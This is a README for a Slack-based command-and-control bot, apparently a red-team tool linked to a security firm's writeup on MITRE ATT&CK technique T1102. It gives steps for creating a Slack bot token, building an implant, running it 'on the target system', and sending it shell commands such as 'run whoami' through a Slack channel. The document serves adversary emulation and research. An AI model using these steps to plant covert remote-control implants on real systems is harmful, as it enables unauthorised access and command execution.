# Slack C2bot

Slack C2bot that executes commands and returns the output.

Learn more by reading our full writeup:
[Using Slack as Malicious C2 Vector: MITRE ATT&CK – Web Service (T1102)](https://p16.praetorian.com/blog/using-slack-as-malicious-c2-vector-mitre-attack-web-service-t1102)

## Setup

Install Golang and requirements:

```
sudo apt install golang-go
sudo apt install git
```

Install the Slack library:

```
go get "github.com/nlopes/slack"
```

## Usage

```
./build.sh [$CHANID] [$SLACKTOKEN]
```

The build script will generate a UUID for your bot.

If you dont already have a workspace you will need to [create one](https://slack.com/create).

Once you have a workspace, open a channel and note the channel id. This can be found by opening the channel in your browser. The uri is /messages/channelid/.

Save this as $CHANID.

Next, you will need to add a bot to your workspace. This can be done using the following steps:

- [Open https://api.slack.com/](https://api.slack.com/)
- Click Start building. Enter the name of the bot and the workspace.
- On the left menu listing, click: OAuth & Permissions
- Scroll down to Scopes. Add channels:history and chat:write:bot permissions.
- Click save.
- Scroll to the top of the page and click Install App to Workspace.
- Click authorize on the new popup.


Slack OAuth Token. This can be found by opening Your Apps -> Click the bot -> OAuth & Permissions.

Save this as $SLACKTOKEN.

Run the build script.

```
./build.sh $CHANID $SLACKTOKEN
```

Run the Slack c2 bot on the target system.

```
./output/lin_implant.bin
```

Open the Slack channel.

After the bot checks-in, you can task the bot to execute a command using the
following syntax:

```
[UUID] run whoami
```

The bot will post the output. 
